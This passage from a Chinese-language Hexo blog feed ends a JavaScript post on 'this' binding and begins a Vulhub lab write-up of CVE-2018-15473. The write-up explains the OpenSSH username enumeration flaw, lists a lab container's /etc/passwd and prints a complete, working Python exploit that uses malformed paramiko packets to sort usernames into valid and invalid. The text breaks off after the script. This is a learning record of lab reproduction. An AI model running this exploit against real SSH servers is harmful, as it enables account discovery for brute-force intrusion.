class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码中，<code>m</code>是多层对象内部的一个方法。为求简便，将其赋值给<code>hello</code>变量，结果调用时，<code>this</code>指向了顶层对象。为了避免这个问题，可以只将<code>m</code>所在的对象赋值给<code>hello</code>，这样调用时，<code>this</code>的指向就不会变。</p><pre class="line-numbers language-none"><code class="language-none">var hello &#x3D; a.b;hello.m() &#x2F;&#x2F; Hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h3 id="绑定-this-的方法"   >          <a href="#绑定-this-的方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#绑定-this-的方法" class="headerlink" title="绑定 this 的方法"></a>绑定 this 的方法</h3>      <ol><li><p><code>Function.prototype.call(obj,arg1,arg2,.....)</code></p><p>对于一个函数来说，call方法就是在obj为this的情况下执行函数，如果不传入参数那么就会直接在全局情况下执行，obj为null或undefined也是以全局环境执行</p></li><li><p><code>Function.prototype.apply(thisValue, [arg1, arg2, ...])</code> </p><p>和call的唯一区别就是一个是一个一个传入，一个是传参数数组</p></li><li><p><code>Function.prototype.bind(obj)</code></p><p>以传入的对象为this，返回重新绑定的函数</p></li></ol><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE</title>
      <link href="/posts/67caa546.html"/>
      <url>/posts/67caa546.html</url>
      
        <content type="html"><![CDATA[        <h1 id="CVE"   >          <a href="#CVE" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1>      <p>在Vulhub上面的CVE复现，一份小记录</p>        <h2 id="OpenSSH"   >          <a href="#OpenSSH" class="heading-link"><i class="fas fa-link"></i></a><a href="#OpenSSH" class="headerlink" title="OpenSSH"></a>OpenSSH</h2>              <h3 id="CVE-2018-15473"   >          <a href="#CVE-2018-15473" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2018-15473" class="headerlink" title="CVE-2018-15473"></a>CVE-2018-15473</h3>      <p>漏洞内容：在OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，可以判断某个用户名是否存在于目标主机中</p><p>漏洞作用：我们用弱口令、爆破等方式进行尝试登录时，ssh需要的用户名和账户名不管是一致还是不一致，都会给我们一个登录延迟的假象，让我们以为可以登录成功，实则不管你的用户名是否是正确的，它都会让你输入密码，然后告诉你登录失败，因此我们必须知道对方用户准确的用户名，让我们在接下来不管是弱口令登录还是暴力破解方面都很有帮助</p><p>利用条件：OpenSSH 版本&lt;7.7</p><p>漏洞复现：</p><ol><li><p>进入docker更改密码，此处改为<code>123456</code></p></li><li><p>ssh连接docker，查看<code>/etc/passwd</code>文件来查看用户名</p><pre class="line-numbers language-none"><code class="language-none">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falsesshd:x:74:74:Privilege-separated SSH:&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;sshd:&#x2F;sbin&#x2F;nologinvulhub:x:1000:1000:,,,:&#x2F;home&#x2F;vulhub:&#x2F;bin&#x2F;bashexample:x:1001:1001:,,,:&#x2F;home&#x2F;example:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>测试exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># python2 exp.py --port SSH端口 --userList 用户名字典 IP</span><span class="token comment">###########################################################################</span><span class="token comment">#                ____                    _____ _____ _    _               #</span><span class="token comment">#               / __ \                  / ____/ ____| |  | |              #</span><span class="token comment">#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #</span><span class="token comment">#              | |  | | '_ \ / _ \ '_ \ \___ \\___ \|  __  |              #</span><span class="token comment">#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #</span><span class="token comment">#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #</span><span class="token comment">#                     | |               Username Enumeration              #</span><span class="token comment">#                     |_|                                                 #</span><span class="token comment">#                                                                         #</span><span class="token comment">###########################################################################</span><span class="token comment"># Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #</span><span class="token comment"># Vulnerability: CVE-2018-15473                                           #</span><span class="token comment"># Affected Versions: OpenSSH version &lt; 7.7                                #</span><span class="token comment"># Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #</span><span class="token comment"># Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #</span><span class="token comment"># Email: Justin.Gardner@SynerComm.com                                     #</span><span class="token comment"># Date: August 20, 2018                                                   #</span><span class="token comment">###########################################################################</span><span class="token keyword">import</span> argparse<span class="token keyword">import</span> logging<span class="token keyword">import</span> paramiko<span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> socket<span class="token keyword">import</span> string<span class="token keyword">import</span> sys<span class="token keyword">import</span> json<span class="token keyword">from</span> random <span class="token keyword">import</span> randint <span class="token keyword">as</span> rand<span class="token keyword">from</span> random <span class="token keyword">import</span> choice <span class="token keyword">as</span> choice<span class="token comment"># store function we will overwrite to malform the packet</span>old_parse_service_accept <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span><span class="token comment"># list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target</span><span class="token comment"># with these 3 random usernames (there is an almost 0 possibility that they can be real ones)</span>random_username_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># populate the list</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    random_username_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token comment"># create custom exception</span><span class="token keyword">class</span> <span class="token class-name">BadUsername</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token comment"># create malicious "add_boolean" function to malform packet</span><span class="token keyword">def</span> <span class="token function">add_boolean</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token comment"># create function to call when username was invalid</span><span class="token keyword">def</span> <span class="token function">call_error</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> BadUsername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># create the malicious function to overwrite MSG_SERVICE_ACCEPT handler</span><span class="token keyword">def</span> <span class="token function">malform_packet</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    old_add_boolean <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> add_boolean    result  <span class="token operator">=</span> old_parse_service_accept<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token comment">#return old add_boolean function so start_client will work again</span>    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> old_add_boolean    <span class="token keyword">return</span> result<span class="token comment"># create function to perform authentication with malformed packet and desired username</span><span class="token keyword">def</span> <span class="token function">checkUsername</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># instantiate transport</span>    transport <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span>sock<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        transport<span class="token punctuation">.</span>start_client<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>SSHException<span class="token punctuation">:</span>        <span class="token comment"># server was likely flooded, retry up to 3 times</span>        transport<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> tried <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            tried <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">return</span> checkUsername<span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Failed to negotiate SSH transport'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        transport<span class="token punctuation">.</span>auth_publickey<span class="token punctuation">(</span>username<span class="token punctuation">,</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> BadUsername<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>AuthenticationException<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token comment">#Successful auth(?)</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"There was an error. Is this the correct version of OpenSSH?"</span><span class="token punctuation">)</span><span class="token comment"># function to test target system using the randomly generated usernames</span><span class="token keyword">def</span> <span class="token function">checkVulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    vulnerable <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> random_username_list<span class="token punctuation">:</span>        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            vulnerable <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> vulnerable<span class="token keyword">def</span> <span class="token function">exportJSON</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Valid"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Invalid"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'Valid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span><span class="token string">'Valid'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'Invalid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span><span class="token string">'Invalid'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exportCSV</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>    final <span class="token operator">=</span> <span class="token string">"Username, Valid\n"</span>    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>        final <span class="token operator">+=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">", "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>    <span class="token keyword">return</span> final<span class="token keyword">def</span> <span class="token function">exportList</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>    final <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is a valid user!\n"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is not a valid user!\n"</span>    <span class="token keyword">return</span> final<span class="token comment"># assign functions to respective handlers</span>paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span> <span class="token operator">=</span> malform_packetparamiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_USERAUTH_FAILURE<span class="token punctuation">]</span> <span class="token operator">=</span> call_error<span class="token comment"># get rid of paramiko logging</span>logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'paramiko.transport'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>NullHandler<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>arg_parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'hostname'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The target hostname or ip address"</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The target port"</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--threads'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The number of threads to be used"</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--outputFile'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The output file location"</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--outputFormat'</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'csv'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The output file location"</span><span class="token punctuation">)</span>group <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--username'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The single username to validate"</span><span class="token punctuation">)</span>group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--userList'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The list of usernames (one per line) to enumerate through"</span><span class="token punctuation">)</span>args <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Connecting to host failed. Please check the specified host and port.'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># first we run the function to check if host is vulnerable to this CVE</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> checkVulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># most probably the target host is either patched or running a version not affected by this CVE</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Target host most probably is not vulnerable or already patched, exiting..."</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>username<span class="token punctuation">:</span> <span class="token comment">#single username passed in</span>        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>args<span class="token punctuation">.</span>username<span class="token punctuation">)</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is a valid user!"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is not a valid user!"</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>userList<span class="token punctuation">:</span> <span class="token comment">#username list passed in</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>userList<span class="token punctuation">)</span>        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] File doesn't exist or is unreadable."</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        usernames <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">,</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># map usernames to their respective threads</span>        pool <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span>args<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>        results <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>checkUsername<span class="token punctuation">,</span> usernames<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>                outputFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>outputFile<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Cannot write to outputFile."</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">'json'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in JSON form."</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">'csv'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in CSV form."</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in List form."</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment"># no usernames passed in</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] No usernames provided to check"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 